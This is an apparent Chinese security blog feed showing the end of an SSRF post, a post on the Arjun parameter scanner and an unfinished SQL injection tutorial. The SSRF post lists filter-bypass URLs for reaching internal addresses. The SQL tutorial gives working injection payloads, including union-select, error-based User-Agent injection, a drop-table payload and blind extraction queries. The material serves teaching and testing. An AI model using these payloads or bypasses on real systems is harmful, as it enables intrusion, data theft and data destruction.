匹配允许访问的网址</li><li>限制协议： 仅允许http和https请求。</li><li>限制IP：     避免应用被用来获取内网数据，攻击内网。</li><li>限制端口： 限制请求的端口为http常用的端口，比如，80,443,8080,8090。</li><li>过滤返回信息： 验证远程服务器对请求的响应是比较简单的方法。</li><li>统一错误信息： 免用户可以根据错误信息来判断远端服务器的端口状态</li></ul><p>绕过：</p><ul><li><p>使用<code>@</code>绕过</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http<span class="hljs-regexp">//</span>baidu.com@<span class="hljs-number">1.1</span>.<span class="hljs-number">1.1</span>  <span class="hljs-regexp">//</span> 与http:<span class="hljs-regexp">//</span><span class="hljs-number">1.1</span>.<span class="hljs-number">1.1</span>效果是一样的<br></code></pre></td></tr></table></figure></li><li><p>进制转换</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs dns">字符串:       <span class="hljs-number">10.0.0.3</span><br>二进制:       <span class="hljs-number">00001010</span> . <span class="hljs-number">00000000</span> . <span class="hljs-number">00000000</span> . <span class="hljs-number">00000011</span><br>十六进制:     <span class="hljs-number">0</span><span class="hljs-keyword">A</span>.<span class="hljs-number">00</span>.<span class="hljs-number">00</span>.<span class="hljs-number">03</span><br>整数:         <span class="hljs-number">167772163</span><br>// <span class="hljs-number">8</span>进制代替<span class="hljs-number">10</span>进制，在计算机的世界里，一旦在<span class="hljs-number">20</span>前面加个<span class="hljs-number">0</span>就会变成<span class="hljs-number">8</span>进制<br>十六进制：     http://<span class="hljs-number">0</span>x0A.<span class="hljs-number">0x00.0x00</span>.<span class="hljs-number">0</span>x03<br>八进制：       http://<span class="hljs-number">012.00.00</span>.<span class="hljs-number">03</span><br>八进制溢出：    http://<span class="hljs-number">265.0.0</span>.<span class="hljs-number">3</span><br></code></pre></td></tr></table></figure></li><li><p>使用<code>。</code>代替<code>.</code></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">127</span>。<span class="hljs-number">0.0</span>.<span class="hljs-number">1</span>   <span class="hljs-regexp">//</span> http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><br></code></pre></td></tr></table></figure></li><li><p>泛域名解析<br>使用xip.io(37signals开发实现的定制DNS服务) 和 xip.name 绕过：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">10</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>.xip.io # 解析到 <span class="hljs-number">10.0.0.1</span><br><span class="hljs-attribute">www</span>.<span class="hljs-number">10.0.0.2</span>.xip.io # www 子域解析到 <span class="hljs-number">10.0.0.2</span><br><span class="hljs-attribute">mysite</span>.<span class="hljs-number">10.0.0.3</span>.xip.io # mysite 子域解析到 <span class="hljs-number">10.0.0.3</span><br><span class="hljs-attribute">foo</span>.bar.<span class="hljs-number">10.0.0.4</span>.xip.io # foo.bar 子域解析到 <span class="hljs-number">10.0.0.4</span><br></code></pre></td></tr></table></figure></li><li><p>127.0.0.1 绕过</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">http://localhost:80<br><span class="hljs-link">http://</span>[<span class="hljs-string">::</span>]:80<br>http://0/<br></code></pre></td></tr></table></figure></li><li><p>Enclosed alphanumerics</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ  <span class="hljs-regexp">//</span> http:<span class="hljs-regexp">//</span>example.com<br></code></pre></td></tr></table></figure></li><li><p>使用302跳转</p></li><li><p>DNS重绑</p></li></ul><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><section class="footnotes"><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span><a href="https://www.jianshu.com/p/7f33f9c7997b">https://www.jianshu.com/p/7f33f9c7997b</a><a href="#fnref:1" rev="footnote" class="footnote-backref"> ↩</a></span></span></li></ol></div></section>]]></content>
    
    
    <categories>
      
      <category>web安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CSRF SSRF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Arjun初探</title>
    <link href="/2023/03/21/arjun%E5%88%9D%E6%8E%A2/"/>
    <url>/2023/03/21/arjun%E5%88%9D%E6%8E%A2/</url>
    
    <content type="html"><![CDATA[<h1 id="Arjun为何"><a href="#Arjun为何" class="headerlink" title="Arjun为何"></a>Arjun为何</h1><p>Arjun是一款基于python开发的http参数扫描器，采用二分法的思想。爆破url参数，自带25980个参数，Arjun会将参数分为25个块，根据response的长度判断是否有有效参数。</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>arjun无法在Python&lt;3.4的环境下下运行。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">pip3 install arjun<br></code></pre></td></tr></table></figure><p>注：kali自带python2与python3环境但缺少pip，所以需先安装pip</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo apt-get install python3-pip<br></code></pre></td></tr></table></figure><p><img src="/img/arjun/arjun1.jpg" alt="安装arjun"></p><h2 id="参数详情"><a href="#参数详情" class="headerlink" title="参数详情"></a>参数详情</h2><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs prolog">usage: arjun [-h] [-u <span class="hljs-symbol">URL</span>] [-o <span class="hljs-symbol">JSON_FILE</span>] [-oT <span class="hljs-symbol">TEXT_FILE</span>] [-oB [<span class="hljs-symbol">BURP_PORT</span>]] [-d <span class="hljs-symbol">DELAY</span>]<br>             [-t <span class="hljs-symbol">THREADS</span>] [-w <span class="hljs-symbol">WORDLIST</span>] [-m <span class="hljs-symbol">METHOD</span>] [-i [<span class="hljs-symbol">IMPORT_FILE</span>]] [-<span class="hljs-symbol">T</span> <span class="hljs-symbol">TIMEOUT</span>] [-c <span class="hljs-symbol">CHUNKS</span>]<br>             [-q] [--headers [<span class="hljs-symbol">HEADERS</span>]] [--passive [<span class="hljs-symbol">PASSIVE</span>]] [--stable] [--include <span class="hljs-symbol">INCLUDE</span>]<br>             [--disable-redirects]<br><br>optional arguments:<br>  -h, --help            查看帮助信息并退出<br>  -u <span class="hljs-symbol">URL</span>                指定目标 <span class="hljs-symbol">URL</span><br>  -o <span class="hljs-symbol">JSON_FILE</span>, -oJ <span class="hljs-symbol">JSON_FILE</span><br>                        指定json输出文件路径.<br>  -oT <span class="hljs-symbol">TEXT_FILE</span>         指定text输出文件路径.<br>  -oB [<span class="hljs-symbol">BURP_PORT</span>]       输出到 <span class="hljs-symbol">Burp</span> <span class="hljs-symbol">Suite</span> 代理的端口。 默认端口为 <span class="hljs-number">8080.</span><br>  -d <span class="hljs-symbol">DELAY</span>              指定请求延迟（以秒为单位）. (default: <span class="hljs-number">0</span>)<br>  -t <span class="hljs-symbol">THREADS</span>            指定线程数. (default: <span class="hljs-number">5</span>)<br>  -w <span class="hljs-symbol">WORDLIST</span>           指定字典路径. (default: &#123;arjundir&#125;/db/large.txt)<br>  -m <span class="hljs-symbol">METHOD</span>             指定请求模式: <span class="hljs-symbol">GET</span>/<span class="hljs-symbol">POST</span>/<span class="hljs-symbol">XML</span>/<span class="hljs-symbol">JSON</span>/<span class="hljs-symbol">HEADERS</span>. (default: <span class="hljs-symbol">GET</span>)<br>  -i [<span class="hljs-symbol">IMPORT_FILE</span>]      从指定文件获取<span class="hljs-symbol">URLs</span>.<br>  -<span class="hljs-symbol">T</span> <span class="hljs-symbol">TIMEOUT</span>            <span class="hljs-symbol">HTTP</span> 请求超时秒数. (default: <span class="hljs-number">15</span>)<br>  -c <span class="hljs-symbol">CHUNKS</span>             请求块大小，一次发送的参数数量. (default: <span class="hljs-number">25</span>)<br>  -q                    <span class="hljs-symbol">Quiet</span> mode. 无输出.<br>  --headers [<span class="hljs-symbol">HEADERS</span>]   指定请求头，以行分隔.<br>  --passive [<span class="hljs-symbol">PASSIVE</span>]   被动收集参数模式.<br>  --stable              稳定优先模式.<br>  --include <span class="hljs-symbol">INCLUDE</span>     自定义请求包含数据.<br>  --disable-redirects   禁止重定向<br><br></code></pre></td></tr></table></figure><h2 id="原理详情"><a href="#原理详情" class="headerlink" title="原理详情"></a>原理详情</h2><h3 id="使用proxychains4-把arjun流量代理到burp-suite"><a href="#使用proxychains4-把arjun流量代理到burp-suite" class="headerlink" title="使用proxychains4 把arjun流量代理到burp suite:"></a>使用proxychains4 把arjun流量代理到burp suite:</h3><p>编辑proxychains4配置文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim /etc/proxychains4.conf<br></code></pre></td></tr></table></figure><p>在Proxylist填写burp suite代理端口，我这里是8080：<br><img src="/img/arjun/arjun2.jpg" alt="proxychains4代理设置"><br>代理arjun：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">proxychains4 arjun -u http://127.1:80/<span class="hljs-built_in">test</span> -oT result.txt<br></code></pre></td></tr></table></figure><p>查看arjun数据包：</p><p><img src="/img/arjun/arjun3.jpg" alt="arjun 1"><br><img src="/img/arjun/arjun4.jpg" alt="arjun 2"><br><img src="/img/arjun/arjun5.jpg" alt="arjun 3"><br>Arjun会将参数分为25个块，一个块400个参数，根据response的长度判断是否有有效参数，若有有效参数，进一步二分，判断有效参数，只需要向目标发送30-5个请求即可完成任务。</p>]]></content>
    
    
    <categories>
      
      <category>工具</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Arjun</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SQL Injection的前世今生浅谈</title>
    <link href="/2023/03/20/SQL%20Injection%E7%9A%84%E5%89%8D%E4%B8%96%E4%BB%8A%E7%94%9F%E6%B5%85%E8%B0%88/"/>
    <url>/2023/03/20/SQL%20Injection%E7%9A%84%E5%89%8D%E4%B8%96%E4%BB%8A%E7%94%9F%E6%B5%85%E8%B0%88/</url>
    
    <content type="html"><![CDATA[<h1 id="前世"><a href="#前世" class="headerlink" title="前世"></a>前世</h1><h2 id="1998"><a href="#1998" class="headerlink" title="1998"></a>1998</h2><p>时光回溯到1998年，这一年是中国证券市场的开端，这一年乌蝇哥在《旺角卡门》里贡献出了在16年火遍大江南北的表情包<sup id="fnref:1" class="footnote-ref"><a href="#fn:1" rel="footnote"><span class="hint--top hint--rounded" aria-label="[激荡四十年-1988](https://www.bilibili.com/video/BV1bX4y1V7KF/?spm_id_from=333.999.0.0&vd_source=249ffa3703b6e86763a24381e58a14a4)">[1]</span></a></sup> ，也是这一年Rain Forest Puppy（RFP）在杂志phrack 54上发表题目为《NT web Technology vulnerabilities》<sup id="fnref:2" class="footnote-ref"><a href="#fn:2" rel="footnote"><span class="hint--top hint--rounded" aria-label="http://phrack.org/issues/54/8.html#article">[2]</span></a></sup>的文章，在 —[ ODBC and MS SQL server 6.5 这一节首次提到了SQL注入</p><h2 id="1999"><a href="#1999" class="headerlink" title="1999"></a>1999</h2><p>1999年2月，Allaire发出警告 “Multiple SQL Statements in Dynamic Queries”<sup id="fnref:3" class="footnote-ref"><a href="#fn:3" rel="footnote"><span class="hint--top hint--rounded" aria-label="https://www.51cto.com/article/231122.html">[3]</span></a></sup></p><p>1999年5月， RFP与Matthew Astley发出警告 “NT ODBC Remote Compromise”</p><h2 id="2000"><a href="#2000" class="headerlink" title="2000"></a>2000</h2><p>2000年2月，RFP发表文章 “How I hacked Packetstorm – A look at hacking  wwthreads via SQL”，披露如何利用SQL注入攻击渗透Packetstorm网站</p><p>2000年9月，David Litchfield在Blackhat会议上发表主题演讲“Application Assessments on IIS”</p><p>2000年10月，Chip Andrews在SQLSecurity.com 上发表“SQL Injection FAQ ”，首次公开使用“SQL注入”这个术语</p><h2 id="2001"><a href="#2001" class="headerlink" title="2001"></a>2001</h2><p>2001年4月，David Litchfield 在Blackhat会议上发表主题演讲 “Remote Web Application Disassembly with ODBC Error Messages”</p><h2 id="2002"><a href="#2002" class="headerlink" title="2002"></a>2002</h2><p>2002年1月，Chris Anley发表论文“Advanced SQL Injection in SQL Server”，首次深度探讨该类攻击</p><p>2002年6月，Chris Anley发表论文 “(more) Advanced SQL” ，补充同年1月发表的论文缺少的细节</p><h2 id="2004"><a href="#2004" class="headerlink" title="2004"></a>2004</h2><p>2004年Blackhat会议上， 0x90.org发布了SQL注入工具SQeaL ( Absinthe的前身)</p><h2 id="2006"><a href="#2006" class="headerlink" title="2006"></a>2006</h2><p>2006年7月25日，Daniele Bellucci在 SourceForge 上注册了sqlmap项目并添加了对MySQL的有限的支持</p><p>同年8月Daniele 添加了对 PostgreSQL 的初步支持并发布了0.1版</p><p>至此进入SQL Injection进入自动化时代，我们可以从sqlmap的更新与历史<sup id="fnref:4" class="footnote-ref"><a href="#fn:4" rel="footnote"><span class="hint--top hint--rounded" aria-label="https://github.com/sqlmapproject/sqlmap/wiki/History">[4]</span></a></sup>里窥见SQL Injection发展史的一角</p><h1 id="今生"><a href="#今生" class="headerlink" title="今生"></a>今生</h1><h2 id="SQL-Injection为何"><a href="#SQL-Injection为何" class="headerlink" title="SQL Injection为何"></a>SQL Injection为何</h2><p>SQL注入是因为后台执行SQL语句时拼接了用户的输入，仅此而已</p><h2 id="SQL-Injection的分类"><a href="#SQL-Injection的分类" class="headerlink" title="SQL Injection的分类"></a>SQL Injection的分类</h2><h3 id="按注入点分类"><a href="#按注入点分类" class="headerlink" title="按注入点分类"></a>按注入点分类</h3><h4 id="数字型"><a href="#数字型" class="headerlink" title="数字型"></a>数字型</h4><p>数字型也就是我们注入点的参数为int类型，在url上大概长下面这个样子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://ex.com/query.php?id=1<br></code></pre></td></tr></table></figure><p>后端接受数据以php为例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$query</span> = <span class="hljs-string">&quot;select name,age,gender from t_students where id = <span class="hljs-subst">&#123;$_GET[&quot;id&quot;]&#125;</span>&quot;</span>;<br></code></pre></td></tr></table></figure><p>注入payload:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,database(),<span class="hljs-number">3</span> <span class="hljs-comment">--</span><br></code></pre></td></tr></table></figure><p>那么后端接受到的数据就会变成：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$query</span> = <span class="hljs-string">&quot;select name,age,gender from t_students where id = 1 union select 1,database(),3 -- &quot;</span>;<br></code></pre></td></tr></table></figure><h4 id="字符型"><a href="#字符型" class="headerlink" title="字符型"></a>字符型</h4><p>数字型也就是我们注入点的参数为str类型，在url上大概长下面这个样子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://ex.com/query.php?uname=admin<br></code></pre></td></tr></table></figure><p>后端接受数据以php为例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$query</span> = <span class="hljs-string">&quot;select name,age,gender from t_students where uname = &#x27;<span class="hljs-subst">&#123;$_GET[&#x27;uname&#x27;]&#125;</span>&#x27;&quot;</span>;<br></code></pre></td></tr></table></figure><p>注入payload：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">admin<span class="hljs-string">&#x27; union select 1,database(),3 --</span><br></code></pre></td></tr></table></figure><p>那么后端接受到的数据会变成：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$query</span> = <span class="hljs-string">&quot;select name,age,gender from t_students where uname = &#x27;admin&#x27; union select 1,database(),3 --&quot;</span><br></code></pre></td></tr></table></figure><h4 id="搜索型"><a href="#搜索型" class="headerlink" title="搜索型"></a>搜索型</h4><p>搜索型也就是我们注入点在搜索框，它后端接受数据大概长这样：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$pwd</span> = &amp;_GET[<span class="hljs-string">&#x27;something&#x27;</span>]<br><span class="hljs-variable">$query</span> = <span class="hljs-string">&quot;select * from commodity where name like &#x27;%<span class="hljs-subst">$something</span>%&#x27; order by price&quot;</span>;<br></code></pre></td></tr></table></figure><p>注入payload：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27; and drop table commodity and &#x27;</span><span class="hljs-operator">%</span><span class="hljs-string">&#x27;=&#x27;</span><br></code></pre></td></tr></table></figure><p>那么后端接受到的数据就会变成：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$query</span> = <span class="hljs-string">&quot;select * from commodity where name like &#x27;%&#x27; and drop table commodity and &#x27;%&#x27;=&#x27;%&#x27; order by price&quot;</span>;<br></code></pre></td></tr></table></figure><p>就会删除服务器里的commodity表，现在我们大概了解了sql注入的原理，就是用户的输入被拼接到数据库中执行了那么我们接着看一下其他的分类</p><h3 id="按提交方式分类"><a href="#按提交方式分类" class="headerlink" title="按提交方式分类"></a>按提交方式分类</h3><h4 id="get注入"><a href="#get注入" class="headerlink" title="get注入"></a>get注入</h4><p>数据是以get方式提交的，注入点一般在get提交的url后面，可以使用的hackbar以及burp suite进行更方便的注入</p><h4 id="post注入"><a href="#post注入" class="headerlink" title="post注入"></a>post注入</h4><p>数据是以post方式提交的，注入点一般在表单填写处，如资料填写等地方，需使用burp suite之类的抓包工具修改与注入</p><h4 id="cookie注入"><a href="#cookie注入" class="headerlink" title="cookie注入"></a>cookie注入</h4><p>cookie注入是因为一些获取参数的函数会从cookie中寻找数据而引发的在对方对get和post注入都进行了防御的时候，有可能忽视cookie，所以在get，post直接注入不行的时候可以尝试cookie注入，但其注入的原理与正常注入的原理是一样的</p><p>在ASP中如果服务器读取值用的是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asp">ID = Request(&quot;ID&quot;)<br></code></pre></td></tr></table></figure><p>当WEB服务器没有在get与post中取到数据的时候会去cookie中寻找数据，如果对于从cookie取得的值没有经过处理的话，就会引起cookie注入</p><p>如果使用的是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs asp">ID = Request.QueryString(&quot;ID&quot;) // 获取以GET方式提交的数据<br>ID = Request.Form(&quot;ID&quot;)   // 获取以POST方式提交的数据<br></code></pre></td></tr></table></figure><p>就不会有cookie注入</p><h4 id="http头注入-5"><a href="#http头注入-5" class="headerlink" title="http头注入[5]"></a>http头注入<sup id="fnref:5" class="footnote-ref"><a href="#fn:5" rel="footnote"><span class="hint--top hint--rounded" aria-label="https://blog.csdn.net/weixin_44426869/article/details/104326877">[5]</span></a></sup></h4><p>先说SQL注入应该不局限于<code>select</code>其他如<code>insert</code>，<code>update</code>，<code>delete</code>函数也是可以注入的</p><p>再说常见的http头注入的参数</p><pre><code class="hljs">- User-Agent // 是的服务器能识别客户操作系统，浏览器版本等- cookie   // 身份鉴别- X-Forwarded-For   // XFF头，它代表客户端，也就是HTTP的请求端真实的ip- Client-Ip    //同上- Rerferer   // 请求来源的上级页面- Host    // 指定访问的web服务器域名或ip和端口号- ....</code></pre><p>当服务器要获取客户端信息，比如获取User-Agent的值并<code>insert into</code>数据库时，就会发生http头注入</p><p>常见相关函数：</p><pre><code class="hljs">- UpdateXML(xml_target,xpath_expr,new_xml)    - 此函数将xml_target中用xpath_expr路径匹配xml片段用new_xml替换，返回更改的xml    - xml_target被替换的部分与xpath_expr用户提供的xpath表达式匹配    - 如果找不到表达式匹配xpath_expr项，或找到多个匹配项，则该函数返回原始xml_targetXML片段    - 三个参数都为字符串- ExtractVakue(xml_frag,xpath_expr)    - 此函数返回在xml_frag用xpath_expr路径匹配到的xml片段- floor(x)    - 此函数返回不大于x的最大整数</code></pre><p>在UpdateXML()、ExtractValue()函数中，当参数xpath_expr路径语法错误时，就会报错<a href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5">(详见报错注入)</a>，将xpath_expr中内容当作sql语句执行后结果和报错结果一同返回</p><p>floor()报错，需要count()、rand()、group by，三者缺一不可<br><code>floor(rand(0)*2)</code>每次执行结果是基本固定的——011011…<br>在使用<code>group by floor(rand(0)*2)</code>创建虚拟表的过程中，向虚拟表中插入数据时，主键的计算产生相同的结果，插入报错</p><p>以update_xml为例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$uagent</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_USER_AGENT&#x27;</span>]<br>inset into uaget (<span class="hljs-string">&#x27;uagent&#x27;</span>.<span class="hljs-string">&#x27;username&#x27;</span>) values (<span class="hljs-string">&#x27;$uagent&#x27;</span>,<span class="hljs-string">&#x27;uname&#x27;</span>);<br></code></pre></td></tr></table></figure><p>当http请求头payload为：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">User</span>-Agent:&#x27; or updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e,database(),<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e),<span class="hljs-number">1</span>),<span class="hljs-number">1</span>)# Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win<span class="hljs-number">64</span>; x<span class="hljs-number">64</span>)<br></code></pre></td></tr></table></figure><p>后端接受到的数据为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">inset into uaget (<span class="hljs-string">&#x27;uagent&#x27;</span>.<span class="hljs-string">&#x27;username&#x27;</span>) values (<span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-keyword">or</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,database(),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>),<span class="hljs-number">1</span>)<span class="hljs-comment"># Mozilla/5.0 (Windows NT 10.0; Win64; x64)&#x27;,&#x27;uname&#x27;);</span><br></code></pre></td></tr></table></figure><p>此时<code>#</code>后面的内容被注释掉了，通过制造报错信息，会把查询到的信息显示出来</p><h3 id="按执行效果分类"><a href="#按执行效果分类" class="headerlink" title="按执行效果分类"></a>按执行效果分类</h3><h4 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h4><p>在SQL注入过程中，SQL语句执行查询后，查询数据不能回显到前端页面，需要使用一些特殊的方式来判断是否注入成功的过程就叫盲注<sup id="fnref:6" class="footnote-ref"><a href="#fn:6" rel="footnote"><span class="hint--top hint--rounded" aria-label="https://blog.csdn.net/qq_42477007/article/details/96492174">[6]</span></a></sup></p><ul><li>布尔盲注</li></ul><p>当我们在执行sql语句后，页面只有两种结果，例如返回内容(ture)与不返回内容(flase),这时就可以用过构造逻辑表达式来判断具体内容</p><p>布尔盲注会用到的函数:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">mid</span><span class="hljs-params">(str,start,length)</span></span> <span class="hljs-comment">//字符串截取</span><br><span class="hljs-function"><span class="hljs-title">ORD</span><span class="hljs-params">()</span></span>                 <span class="hljs-comment">//ascii码转换</span><br><span class="hljs-function"><span class="hljs-title">length</span><span class="hljs-params">()</span></span>              <span class="hljs-comment">//统计长度</span><br><span class="hljs-function"><span class="hljs-title">version</span><span class="hljs-params">()</span></span>             <span class="hljs-comment">//查看数据库版本</span><br><span class="hljs-function"><span class="hljs-title">database</span><span class="hljs-params">()</span></span>            <span class="hljs-comment">//查看当前数据库名</span><br><span class="hljs-function"><span class="hljs-title">user</span><span class="hljs-params">()</span></span>                <span class="hljs-comment">//查看当前用户</span><br></code></pre></td></tr></table></figure><p>猜解数据库长度:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27;or length(database()) &gt; 8 --+</span><br></code></pre></td></tr></table></figure><p>猜解数据库名：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27;or mid(database(),1,1)= &#x27;</span>z<span class="hljs-string">&#x27; --+   // 因为需要验证的字符太多，所以转化为ascii码验证</span><br><span class="hljs-string">&#x27;</span><span class="hljs-keyword">or</span> ORD(mid(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)) <span class="hljs-operator">&gt;</span> <span class="hljs-number">100</span> <span class="hljs-comment">--+ // 通过确定ascii码，从而确定数据库名</span><br></code></pre></td></tr></table></figure><p>猜解表总数：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27;or (select count(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()) = 2  --+   //判断表的总数</span><br></code></pre></td></tr></table></figure><p>猜解第一个表名的长度：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27;or (select length(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database() limit 0,1) = 5 --+</span><br><span class="hljs-string">&#x27;</span><span class="hljs-keyword">or</span> (<span class="hljs-keyword">select</span> length(TABLE_NAME) <span class="hljs-keyword">from</span> information_schema.TABLES <span class="hljs-keyword">where</span> TABLE_SCHEMA<span class="hljs-operator">=</span>database() limit <span class="hljs-number">1</span>,<span class="hljs-number">1</span>) <span class="hljs-operator">=</span> <span class="hljs-number">5</span> <span class="hljs-comment">--+ （第二个表）</span><br></code></pre></td></tr></table></figure><p>猜解第一个表名：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27;or mid((select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA = database() limit 0,1 ),1,1) = &#x27;</span>a<span class="hljs-string">&#x27;  --+</span><br><span class="hljs-string">或者</span><br><span class="hljs-string">&#x27;</span><span class="hljs-keyword">Or</span> ORD(mid(<span class="hljs-keyword">select</span> TABLE_NAME <span class="hljs-keyword">from</span> information_schema.TABLES <span class="hljs-keyword">where</span> TABLE_SCHEMA <span class="hljs-operator">=</span> database() limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)) <span class="hljs-operator">&gt;</span><span class="hljs-number">100</span>   <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><p>猜解表的字段的总数：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27;or (select count(column_name) from information_schema.COLUMNS where TABLE_NAME=&#x27;</span>表名<span class="hljs-string">&#x27;) &gt; 5 --+</span><br></code></pre></td></tr></table></figure><p>猜解第一个字段的长度：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 